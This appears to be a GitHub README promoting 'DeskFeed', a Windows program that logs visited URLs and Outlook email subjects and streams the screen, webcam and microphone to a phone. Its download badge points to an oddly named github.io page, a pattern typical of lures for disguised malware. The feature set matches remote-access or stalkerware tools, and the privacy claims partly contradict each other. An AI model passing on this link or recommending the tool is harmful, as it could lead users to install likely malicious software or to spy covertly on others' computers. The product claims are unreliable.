# 🖥️ DeskFeed - Monitor Windows activity on your phone

[![](https://img.shields.io/badge/Download-DeskFeed-blue.svg)](https://decussate-muskusgrass907.github.io)

DeskFeed tracks your computer usage and sends live updates to your Android phone. It records the apps you open, the websites you visit, and the emails you read in Outlook. You can also stream your computer screen, webcam, or microphone to your mobile device.

## ⚙️ System Requirements

Your computer must run Windows 10 or Windows 11. You need a stable internet connection for the remote features to work. Make sure your Android phone runs Android 8.0 or higher. You need at least 500 MB of free storage space on your computer to install the software.

## 📱 Connecting Your Phone

Once you install DeskFeed on your computer, you must link your Android device.

1. Install the DeskFeed companion app from the Google Play Store on your phone.
2. Open the app on your computer.
3. Locate the QR code on the main screen of the desktop app.
4. Open the app on your phone and select the Scan QR Code option.
5. Point your phone camera at the computer screen to capture the code.
6. Wait for the status indicator to turn green, which confirms a successful connection.

## 🔍 Features Explained

DeskFeed provides several tools to help you manage your computer time.

### Activity Tracking
The app logs your active window titles. It identifies the browser you use and stores the full URL of the pages you visit. If you use Outlook, the software saves subject lines of your emails to the local log.

### Remote Live View
You can toggle the stream settings from your phone. Select your primary monitor to see your screen in real time. Enable the webcam or microphone toggle to receive audio and video feeds directly to your mobile device.

### Privacy and Data
All data stays on your local network unless you enable remote streaming. The software uses encrypted channels to transfer your screen data to your phone. We do not store your browsing history on external servers.

## 🛠️ Troubleshooting Common Issues

If you encounter problems, check these solutions first.

* **Connection Errors:** Ensure both your phone and computer connect to the same Wi-Fi network. Firewalls sometimes block the connection, so allow DeskFeed through your Windows Firewall settings.
* **Missing Activity Logs:** Check if the app runs in the system tray. If you close the window, the app continues to run in the background. Right-click the icon in the tray to reopen the main menu.
* **Stream Lag:** High-quality video requires a fast network connection. Reduce the video quality setting in the mobile app if the feed stutters or lags.
* **App Not Starting:** Restart your computer to clear any locked processes. If the issue persists, uninstall the application and download a fresh copy from the main site.

## 📋 Frequently Asked Questions

**Does DeskFeed work on Mac or Linux?**
The current version only supports Windows operating systems.

**Can I monitor multiple computers?**
You can link multiple computers to one phone account. Use the settings menu on your phone to switch between different active devices.

**What happens if I disconnect from the internet?**
The app saves activity logs locally. It syncs the data once you reconnect to the network. Live streaming requires an active connection at all times.

**Is my data private?**
The software processes all monitoring data locally on your machine. No third parties access your URLs, emails, or screen activity.

## 💡 Best Practices

Keep your desktop app updated to ensure the best performance. Check the releases page once a month for new versions. Disable unnecessary background streams to save battery life on your phone. Use a wired ethernet connection for the computer if you plan to stream high-definition video for long periods.
